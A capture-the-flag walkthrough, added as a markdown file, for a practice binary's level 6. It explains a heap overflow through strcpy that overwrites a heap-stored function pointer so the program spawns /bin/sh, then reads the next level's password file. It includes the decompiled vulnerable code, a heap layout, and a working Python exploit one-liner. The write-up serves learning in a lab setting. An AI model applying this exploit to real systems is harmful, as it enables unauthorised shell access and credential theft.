@@ -1,0 +1,174 @@
+# Level 6 Walkthrough
+
+## Goal
+
+Exploit a heap overflow to overwrite a function pointer stored on the
+heap, redirecting execution to `n()` which calls `system("/bin/sh")`.
+
+---
+
+## 1. Analyze the Binary
+
+```bash
+gdb ./level6
+(gdb) info functions
+(gdb) disas main
+(gdb) disas n
+(gdb) disas m
+```
+
+Decompiled logic:
+
+```c
+void m() {
+    puts("Nope");         // default function, does nothing useful
+}
+
+void n() {
+    system("/bin/sh");    // what we want to call
+}
+
+int main(int argc, char **argv) {
+    char *buf1 = malloc(64);   // first heap allocation
+    char *buf2 = malloc(4);    // second heap allocation — stores a function pointer
+
+    *((void **)buf2) = m;      // buf2 points to m() by default
+
+    strcpy(buf1, argv[1]);     // ← vulnerable — no bounds check
+
+    (*((void **)buf2))();      // calls whatever buf2 points to
+}
+```
+
+The program allocates two buffers on the heap, stores a function pointer
+in `buf2`, then calls through it. If we overflow `buf1` we can overwrite
+that pointer.
+
+---
+
+## 2. The Vulnerability — Heap Overflow
+
+`strcpy` copies bytes from `argv[1]` into `buf1` until it hits a null
+terminator. It does **no bounds checking**. `buf1` is 64 bytes — anything
+longer spills past it into adjacent heap memory.
+
+Unlike stack overflows where we target the saved return address, here we
+target a **function pointer stored on the heap**.
+
+---
+
+## 3. Heap Layout
+
+Two consecutive `malloc` calls produce adjacent chunks. Each chunk has
+a small **header** the allocator uses to track size and status:
+
+```
+Heap (low → high addresses)
+┌──────────────────────────┐
+│  buf1 chunk header (8B)  │  ← malloc metadata
+├──────────────────────────┤
+│  buf1 data (64B)         │  ← strcpy writes here
+├──────────────────────────┤
+│  buf2 chunk header (8B)  │  ← malloc metadata
+├──────────────────────────┤
+│  buf2 data (4B)          │  ← function pointer lives here
+└──────────────────────────┘
+```
+
+To reach `buf2`'s data from the start of `buf1`:
+
+```
+64 bytes  → fill buf1
+ 8 bytes  → overwrite buf2's chunk header (heap metadata)
+─────────
+72 bytes total → then next 4 bytes overwrite the function pointer
+```
+
+---
+
+## 4. Finding the Address of `n()`
+
+```bash
+(gdb) info functions
+→ 0x08048454  n
+```
+
+Or:
+
+```bash
+objdump -d ./level6 | grep "<n>:"
+→ 08048454 <n>:
+```
+
+---
+
+## 5. Payload Breakdown
+
+```
+["A" × 72][address of n()]
+```
+
+| Part | Purpose |
+|---|---|
+| `"A" × 64` | fills buf1 completely |
+| `"A" × 8` | overwrites buf2's heap metadata header |
+| `\x54\x84\x04\x08` | overwrites buf2's function pointer with address of `n()` |
+
+---
+
+## 6. Exploit
+
+```bash
+./level6 $(python2 -c 'import struct; print "A"*72 + struct.pack("<I", 0x08048454)')
+```
+
+Note: input comes from `argv[1]` here, not stdin — so no pipe or `cat`
+needed. We pass the payload directly as a command line argument.
+
+---
+
+## 7. Execution Flow
+
+```
+main() runs
+     │
+malloc(64) → buf1 at heap address X
+malloc(4)  → buf2 at heap address X+72
+     │
+*buf2 = &m    → buf2 holds 0x08048444 (address of m)
+     │
+strcpy(buf1, argv[1]) copies 76 bytes:
+  [72 × 'A'] overflow past buf1 and header
+  [0x08048454] lands exactly on buf2's function pointer
+     │
+buf2 now holds 0x08048454 (address of n())
+     │
+(*buf2)() is called
+  │
+jumps to n()
+  │
+system("/bin/sh")
+  │
+Shell as level7
+```
+
+---
+
+## 8. Get the Password
+
+```bash
+cat /home/user/level7/.pass
+```
+
+---
+
+## Key Concepts
+
+| Concept | Meaning |
+|---|---|
+| **Heap overflow** | Writing past a heap buffer into adjacent heap memory |
+| **Function pointer** | A variable that holds the address of a function |
+| **Heap metadata** | 8-byte header malloc places before each chunk |
+| **Chunk adjacency** | Consecutive mallocs produce adjacent chunks in memory |
+| **`argv[1]`** | Input via command line argument, not stdin |
+| **`strcpy` unsafe** | No bounds check — copies until null byte regardless of size |
